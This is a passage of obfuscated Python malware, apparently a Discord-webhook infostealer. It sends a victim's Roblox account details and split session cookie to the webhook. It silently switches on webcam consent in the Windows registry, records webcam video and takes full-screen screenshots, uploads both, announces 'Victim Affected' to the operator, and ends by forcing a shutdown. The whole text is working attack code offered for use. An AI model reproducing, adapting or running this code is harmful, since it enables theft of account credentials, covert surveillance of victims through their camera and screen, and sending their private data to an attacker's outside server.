                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.add_field(name=":bust_in_silhouette: Username:", value=f"```{KIWPQSLEAENSGSIMDMRMWCFPOYJESFWILJUQXOMDXOVTJHJYLLBKBAYBSWPKWHGQB}```", inline=True)
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{IVOGOZZGOYYILIXVGOHLMDFZMPGFUKNQHIDXGZDCMTGLMKLVFOQAXCQOAWTDRYCXWJAYQAWGTVCHPBQEFTGDYPRQ}```", inline=True)
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.add_field(name=":robot: Id:", value=f"```{UPGSLTWBSTQDHPCQFSHIFMEIJEHROQGTRIPVBJVHUHHHLWFIKLKDTUCBUGTEN}```", inline=True)
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.add_field(name=":moneybag: Robux:", value=f"```{QVMLQZZSGCHKTGIVNEPFQPEHOWRFMKARVZEUBGWRBTCWCFEZYOPYZYZDHNPOAKMQNFLHFLVCQDKEPIFKMCVJUQ}```", inline=True)
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.add_field(name=":tickets: Premium:", value=f"```{ASKAPNXSLQRPFUIYNUXFILHFULYCDQGBLSLOPEFXMIYQRTTPAMDEKMSUOGMDAYOWDCRUFTXIUC}```", inline=True)
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.add_field(name=":construction_site: Builders Club:", value=f"```{VZJDMKEFOOGFCUKZKWFZWNMDTRUXFSUVVYKDIWFIRCLCLROBZPHFVHLJQYVDHHGPGUGKQYGKMHF}```", inline=True)
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.add_field(name=":cookie: Cookie Part 1:", value=f"```{MKJXYBQJBJEWSOVCANHXIEAVMQODEDLPVBSIEXPDIIBVHXFWKCNXARULQDSGVTAQ}```", inline=False)
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.add_field(name=":cookie: Cookie Part 2:", value=f"```{KHZPQDNCRQUSQGDDPOEVNCOUEHPUERVYBPFIDSSZXGDLYVDWAFBUWPJWUNAP}```", inline=False)

                JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY.send(embed=BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV, username=XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO,
                                avatar_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)
                
    if not JSMSTCBNGWHUITUGBKVDLXLTRVYJZYAPZMUXDWHZATRMRSNYITFOSEDEICCWABWLAJIVTPQKVPVVBDDAOWLPD:
        HVWTOFJWUIDZCVSAYHAFXOPZPUOCIRDLPLRZNNVAUDMOMZRYMDBOEQLNDFNZTYTQFDIXRV(
            IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY, 
            title=f'Roblox Cookie {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:', 
            description=f"No roblox cookie found."
        )

def FBORBBZBGRACONUPVILDZCQEPQXXAXYAQNNYIVOQVAEYNUFQVHBAPCKQTIBUXTLBUHABOLIXYMHHMPULFKHE():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime
    import winreg
    from datetime import datetime

    try:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore" + r'\webcam', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'Value', 0, winreg.REG_SZ, 'Allow')
            winreg.CloseKey(key)
        except: pass
        JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT_file_capture = f"CameraCapture_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.avi"

        def C4ptur3(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG_file_capture):
            VBYFABQVUQZBKBLGAEVQYRKBMJNUUMMJEFJRMNESQUCHXCRNWMKBRQQJMJZMJACYEXOXQOEPTMNNNYYXPT_capture = 15
            HHKVZCQNXAINOXMTFEJYOTZWYPFJHFGIKOGARBFMHWHNOAXNWIUONYKUFDGEVJVLXXZSSTOUNUIZM = cv2.VideoCapture(0)

            if not HHKVZCQNXAINOXMTFEJYOTZWYPFJHFGIKOGARBFMHWHNOAXNWIUONYKUFDGEVJVLXXZSSTOUNUIZM.isOpened():
                HXUUXYARGRHUVXJYAYFPJFTXQBIIRVQEVYNOBDDLIXKNNDODPHO()
                HVWTOFJWUIDZCVSAYHAFXOPZPUOCIRDLPLRZNNVAUDMOMZRYMDBOEQLNDFNZTYTQFDIXRV(
                    IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY, 
                    title=f'Camera Capture {ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE} "{PUTYMKUNNUIKYYDKHXLJFVOCXRVDKRTHSQNBIYPBNUFLKFQGSOPSULCTISTXEOVWFALIWAWM}":', 
                    description=f"No cameras found."
                )
                status = "exit"
                return status
            
            TPQHJQBUDSYMWMYNNSFUKNREZUPGHRSMIMXFUKJSIYRDGVCBKIQNL = cv2.VideoWriter_fourcc(*'XVID')
            BXOGQHOMEOYTVVRLUMNUCCIUNEMALTOIGQMPNLAEPZBHRQEYSNPVMLGWADQJGDZHFFFQHBWZADACFZWCRBQQKZIWNDZQD = cv2.VideoWriter(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG_file_capture, TPQHJQBUDSYMWMYNNSFUKNREZUPGHRSMIMXFUKJSIYRDGVCBKIQNL, 20.0, (640, 480))
            VBYFABQVUQZBKBLGAEVQYRKBMJNUUMMJEFJRMNESQUCHXCRNWMKBRQQJMJZMJACYEXOXQOEPTMNNNYYXPT_start = datetime.now()
            while (datetime.now() - VBYFABQVUQZBKBLGAEVQYRKBMJNUUMMJEFJRMNESQUCHXCRNWMKBRQQJMJZMJACYEXOXQOEPTMNNNYYXPT_start).seconds < VBYFABQVUQZBKBLGAEVQYRKBMJNUUMMJEFJRMNESQUCHXCRNWMKBRQQJMJZMJACYEXOXQOEPTMNNNYYXPT_capture:
                v4r_ret, v4r_frame = HHKVZCQNXAINOXMTFEJYOTZWYPFJHFGIKOGARBFMHWHNOAXNWIUONYKUFDGEVJVLXXZSSTOUNUIZM.read()
                if not v4r_ret:
                    break
                BXOGQHOMEOYTVVRLUMNUCCIUNEMALTOIGQMPNLAEPZBHRQEYSNPVMLGWADQJGDZHFFFQHBWZADACFZWCRBQQKZIWNDZQD.write(v4r_frame)

            HHKVZCQNXAINOXMTFEJYOTZWYPFJHFGIKOGARBFMHWHNOAXNWIUONYKUFDGEVJVLXXZSSTOUNUIZM.release()
            BXOGQHOMEOYTVVRLUMNUCCIUNEMALTOIGQMPNLAEPZBHRQEYSNPVMLGWADQJGDZHFFFQHBWZADACFZWCRBQQKZIWNDZQD.release()
            status = None
            
            return status

        try:
            KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG_file_capture = os.path.join(ICQNZCWHXNCRGFSYNMFIBYCLBIKQGKCUQVSVDXHTKFCHIVUFRPDBERTADQQKSMHBUGTJGWYJJWNK, 'Documents', JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT_file_capture)
            status = C4ptur3(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG_file_capture)
        except:
            KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG_file_capture = JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT_file_capture
            status = C4ptur3(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG_file_capture)
        
        if status == "exit":
            return

        BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV = Embed(title=f"Camera Capture {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:", color=UTZBJCXIIXIRRNPGPVMVRAUQFHGPHNUXVZTCTFTBZDDPJAHSGQYQPDZEVSBBUHQHXDWLOFYAYJQXNWTPXQXX, description=f"```└── 📷 - {JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT_file_capture}```")
        BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.set_footer(text=KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY, icon_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)

        JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY = SyncWebhook.from_url(IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY)
        with open(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG_file_capture, "rb") as f:
            JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY.send(
                embed=BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV,
                file=File(f, filename=JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT_file_capture),
                username=XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO,
                avatar_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA
            )
            
        if os.path.exists(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG_file_capture):
            os.remove(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG_file_capture)
    except Exception as e:
        HVWTOFJWUIDZCVSAYHAFXOPZPUOCIRDLPLRZNNVAUDMOMZRYMDBOEQLNDFNZTYTQFDIXRV(
            IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY, 
            title=f'Camera Capture {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:', 
            description=f"""Unable to make a recording:
            ```{e}```"""
        )

def SKUCVKEZHLCKKBUIUQGKRNFQTRMZGRPQUCNLQGTKKKVWOXZIZIZQWWDXDGEGJZXMZEWDTPXGAHNBGTJXBIAVYBMEHXJYRG():
    import io
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File
    
    try:
        def C4ptur3():
            OQIBCNTRRXXNBAFGCXNBMWEMJZMHGXFXBEEETFHNJXIBNZJGAUGXBMYFZSIZXMHEJIPLYCFGMAP = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            OQIBCNTRRXXNBAFGCXNBMWEMJZMHGXFXBEEETFHNJXIBNZJGAUGXBMYFZSIZXMHEJIPLYCFGMAP_bytes = io.BytesIO()
            OQIBCNTRRXXNBAFGCXNBMWEMJZMHGXFXBEEETFHNJXIBNZJGAUGXBMYFZSIZXMHEJIPLYCFGMAP.save(OQIBCNTRRXXNBAFGCXNBMWEMJZMHGXFXBEEETFHNJXIBNZJGAUGXBMYFZSIZXMHEJIPLYCFGMAP_bytes, format='PNG')
            OQIBCNTRRXXNBAFGCXNBMWEMJZMHGXFXBEEETFHNJXIBNZJGAUGXBMYFZSIZXMHEJIPLYCFGMAP_bytes.seek(0)
            return OQIBCNTRRXXNBAFGCXNBMWEMJZMHGXFXBEEETFHNJXIBNZJGAUGXBMYFZSIZXMHEJIPLYCFGMAP_bytes
        
        OQIBCNTRRXXNBAFGCXNBMWEMJZMHGXFXBEEETFHNJXIBNZJGAUGXBMYFZSIZXMHEJIPLYCFGMAP_bytes = C4ptur3()

        BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV = Embed(title=f"Screenshot {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:", color=UTZBJCXIIXIRRNPGPVMVRAUQFHGPHNUXVZTCTFTBZDDPJAHSGQYQPDZEVSBBUHQHXDWLOFYAYJQXNWTPXQXX)
        BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.set_image(url="attachment://screenshot.png")
        BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.set_footer(text=KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY, icon_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)
        JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY = SyncWebhook.from_url(IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY)
        JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY.send(
            embed=BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV,
            file=File(OQIBCNTRRXXNBAFGCXNBMWEMJZMHGXFXBEEETFHNJXIBNZJGAUGXBMYFZSIZXMHEJIPLYCFGMAP_bytes, filename="screenshot.png"),
            username=XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO,
            avatar_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA
        )
    except Exception as e:
        HVWTOFJWUIDZCVSAYHAFXOPZPUOCIRDLPLRZNNVAUDMOMZRYMDBOEQLNDFNZTYTQFDIXRV(
            IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY, 
            title=f'Screenshot {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:', 
            description=f"""**Unable to take a screenshot:**
            ```{e}```"""
        )

def RATKRKVOUQLVTTCTDLKWGJXIHFUSZLCWJKUECDGPRJYGVGBUPWWDGNHAEQRQBJDZHESQNSVUDHXHYAIGMKWSLU():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')

try: requests.post(IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO, 'avatar_url': PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA,})
except: pass
try: threading.Thread(target=OXGNAOYAKJVVFOMKSZTRGAHFGCBFWOUCCSOEEWUGSKVVIIBKJAQI).start()
except: pass
try: threading.Thread(target=BAGRVMQGNGZUHWDWDZNSHUSDCLNFEHEVUOTJOQSAXJMBZJMFAYQDDVORJNOTEBOIRDMENIEQZKDF).start()
except: pass
try: threading.Thread(target=HNWUVBILBJPYCMZOFPACEWCEVAIXREZIMIAPBZOLINSFHTKPUOOMMDKMJRBYRZHBLTCNCHYJZBRYWAEPBQXOTUXXMMJQWCEATVME).start()
except: pass
try: threading.Thread(target=JTCFPTSPKNMJDUMALOYIQEXSNMRTBKUFFBQKZWABEDVXVUMUPGITPSIUURQWBDRHWSTEWDBTCSVHNWKFXNMSD).start()
except: pass
try: GAOVBKDPFISWHJOQUXVDYXODCWUSTTFHFZDJENICPLRPPWAEYLUSSUPTGQZTDPWQZO()
except: pass
try: PEMOSLFXCLRDSYBWGWMZPODFYHPDFBUICEZFZPDUQSFOAYUEADB()
except: pass
try: CJLOSMPHIPKOHGOICXDIGEHLMQGLESDOJZYUQNHCWBJMGRMMLELDGVWLMYUYTW()
except: pass
try: WXKENTFDBDBLOXMKBKHEQWURYRWBROWVTSEUJUIFLSKQEUTNPMJNMOQLGC()
except: pass
try: NYMQIBNVHPPQJQEOCABEIBKTAWZCCZSSOIVTSENDYFDUZLIXISNKCANGRPYCBGDHWIJDXHAFFWWCUCFWVFARLZNWPJCWPSXIWUPU()
except: pass
try: FBORBBZBGRACONUPVILDZCQEPQXXAXYAQNNYIVOQVAEYNUFQVHBAPCKQTIBUXTLBUHABOLIXYMHHMPULFKHE()
except: pass
try: OOAMUPSPURCKHPMWUDRCJJUTSPPSTQKQBJAJMZSQUSHAZGPWQAHCURZUYTXUEWAVDQYDUWSDZIUTHK()
except: pass
try: SKUCVKEZHLCKKBUIUQGKRNFQTRMZGRPQUCNLQGTKKKVWOXZIZIZQWWDXDGEGJZXMZEWDTPXGAHNBGTJXBIAVYBMEHXJYRG()
except: pass
try: requests.post(IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY, json={'content': f'****╚══════════════════{PUTYMKUNNUIKYYDKHXLJFVOCXRVDKRTHSQNBIYPBNUFLKFQGSOPSULCTISTXEOVWFALIWAWM}══════════════════╝****', 'username': XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO, 'avatar_url': PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA})
except: pass
try: threading.Thread(target=OIPJYLZOTOVYLRVLZWMZYUDXKPAENCDLZTUFACEKBGHOYMJOYZVYSUECCCIQQQACFWRPSYUTMTLETXY).start()
except: pass
try: threading.Thread(target=HBFIIVNBOKYDVWUDUTKRAJIXLSSQIMLPRENDVEZPAXBRRXAAWBUIKXAVSKPJYEZ).start()
except: pass
try: threading.Thread(target=MQRRXMASPNSZOPAGCKXUSEIIUGAUYAALSPYNQDGFDTHNOQLBETIDWAEMPHRBIJEAXHCNFCXUVTNQPZESXBQQFXUTKO).start()
except: pass
try: threading.Thread(target=RATKRKVOUQLVTTCTDLKWGJXIHFUSZLCWJKUECDGPRJYGVGBUPWWDGNHAEQRQBJDZHESQNSVUDHXHYAIGMKWSLU).start()
except: pass
